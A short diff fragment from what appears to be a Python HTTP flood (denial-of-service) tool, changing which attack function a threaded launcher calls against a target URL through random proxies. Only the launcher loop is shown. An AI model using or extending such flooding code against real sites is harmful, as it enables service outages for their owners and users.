@@ -603,7 +603,7 @@ def LaunchPXCFB(url, th, t):
         for i in range(int(th)):
             try:
                 proxy = random.choice(proxies).strip().split(":")
-                thd = threading.Thread(target=AttackPXCFB3, args=(url, until, scraper,proxies,th))
+                thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper,proxies,th))
                 thd.start()
                
 
